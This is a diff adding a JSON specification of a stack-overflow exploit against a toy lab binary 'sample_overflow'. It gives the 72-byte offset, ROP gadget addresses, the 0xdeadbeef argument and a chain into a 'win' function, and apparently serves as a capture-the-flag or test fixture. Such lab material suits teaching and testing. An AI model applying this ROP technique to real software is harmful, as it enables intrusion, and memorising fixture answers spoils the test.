@@ -1,0 +1,59 @@
+{
+  "binary": "sample_overflow",
+  "sha256": "932a4e1387f9a62f5ef8ead40d919d46aa4dcee96d54a526e2480b3fed815c8f",
+  "architecture": "x86_64",
+  "load_base": "0x400000",
+  "protections": ["nx"],
+  "vuln_class": "stack_overflow",
+  "success_marker": "Hello World",
+  "magic": "0xdeadbeef",
+  "vuln": {
+    "function": "vuln",
+    "buffer_size": 64,
+    "saved_rbp_size": 8,
+    "overflow_offset": 72,
+    "input_channel": "stdin",
+    "read_limit": 512,
+    "note": "buf[64] sits at rbp-0x40; 64 + saved rbp(8) = 72 bytes reach the saved return address."
+  },
+  "symbols": {
+    "win": "0x401166",
+    "gadget_pop_rdi": "0x4011ad",
+    "vuln": "0x4011af",
+    "main": "0x4011d0"
+  },
+  "gadgets": [
+    {
+      "address": "0x4011ad",
+      "asm": "pop rdi ; ret",
+      "role": "load rdi with the magic argument"
+    },
+    {
+      "address": "0x4011ae",
+      "asm": "ret",
+      "role": "16-byte stack realignment before entering win"
+    }
+  ],
+  "documented_gadget_addresses": ["0x4011ad", "0x4011ae", "0x401166"],
+  "chain": [
+    {
+      "kind": "padding",
+      "bytes": 72,
+      "fill": "0x41",
+      "note": "fills buf[64] + saved rbp(8) up to the saved return address"
+    },
+    {"kind": "gadget", "address": "0x4011ad", "asm": "pop rdi ; ret"},
+    {
+      "kind": "value",
+      "value": "0xdeadbeef",
+      "note": "popped into rdi: the magic argument win() checks for"
+    },
+    {"kind": "gadget", "address": "0x4011ae", "asm": "ret", "note": "stack realignment"},
+    {
+      "kind": "target",
+      "address": "0x401166",
+      "symbol": "win",
+      "note": "prints the success marker when rdi == magic, then _exit(0)"
+    }
+  ]
+}
